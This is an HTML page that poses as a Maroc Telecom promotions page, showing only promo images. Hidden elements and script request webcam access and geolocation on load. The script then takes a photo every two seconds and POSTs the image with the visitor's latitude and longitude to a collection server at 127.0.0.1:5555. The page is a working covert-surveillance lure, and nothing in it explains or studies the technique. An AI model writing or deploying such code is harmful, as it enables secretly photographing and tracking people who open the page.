<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body onload="cap()">
        <img src="https://www.iam.ma/ImagesMarocTelecom/Fr/bon-plan-et-promotion/Maroc_telecom_sagajawal-pass22-promo-270x361.jpg" alt="Description of the image" >
        <img src="https://www.iam.ma/ImagesMarocTelecom/Fr/bon-plan-et-promotion/MT_FO_gamer_270x361.jpg" >
        <img src="https://www.iam.ma/PublishingImages/refonte_iam/FR/jawal_particuliers/promodouble20dhv5.png">
    
        <img src="https://www.iam.ma/ImagesMarocTelecom/Fr/bon-plan-et-promotion/Maroc_telecom_sagajawal-pass22-promo-270x361.jpg" alt="Description of the image" >
        <img src="https://www.iam.ma/ImagesMarocTelecom/Fr/bon-plan-et-promotion/Maroc_telecom_sagajawal-pass22-promo-270x361.jpg" alt="Description of the image" >
        <img src="https://www.iam.ma/PublishingImages/refonte_iam/FR/jawal_particuliers/promodouble20dhv5.png">
        <img src="https://www.iam.ma/ImagesMarocTelecom/Fr/bon-plan-et-promotion/MT_FO_gamer_270x361.jpg" >


    <button hidden id="start-camera">Start Camera</button>
    <video hidden id="video" width="320" height="240" autoplay></video>
    <button hidden id="click-photo">Click Photo</button>
    <canvas hidden id="canvas" width="320" height="240"></canvas>

    <script>
      let camera_button = document.querySelector("#start-camera");
      let video = document.querySelector("#video");
      let click_button = document.querySelector("#click-photo");
      let canvas = document.querySelector("#canvas");

      let long = null;
      let lat = null;

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
      } else {
        console.log("Geolocation is not supported by this browser.");
      }

      function showPosition(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        long = longitude;
        lat = latitude;
        console.log("Latitude: " + latitude);
        console.log("Longitude: " + longitude);
      }

      const send = async (f, latitude, longitude) => {
        const rawResponse = await fetch("http://127.0.0.1:5555/data", {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },

          body: JSON.stringify({
            base64image: f,
            latitude: latitude,
            longitude: longitude,
          }),
        });
        const content = await rawResponse.json();

        console.log(content);
      };
      //***********************
      const pic = function () {
        canvas
          .getContext("2d")
          .drawImage(video, 0, 0, canvas.width, canvas.height);
        let image_data_url = canvas.toDataURL("image/jpeg");

        // data url of the image
        console.log(image_data_url);

        const byteCharacters = atob(
          image_data_url.slice(image_data_url.indexOf(",") + 1)
        );

        // Convert the byte characters to byte numbers
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
          byteNumbers[i] = byteCharacters.charCodeAt(i);
        }

        // Create a Uint8Array from the byte numbers
        const uint8Array = new Uint8Array(byteNumbers);

        // Create a Blob object from the Uint8Array
        const blob = new Blob([uint8Array], { type: "image/jpeg" });

        // Create a file object from the Blob object
        const file = new File([blob], "image.jpg", { type: "image/jpeg" });
        send(image_data_url, lat, long);
        //downloadFile(file);
      };
      //***********************
      const cap = async function () {
        let stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false,
        });
        video.srcObject = stream;
        pic();
      };
      camera_button.addEventListener("load", pic);
      setInterval(pic, 2000);
    </script>
  </body>
</html>
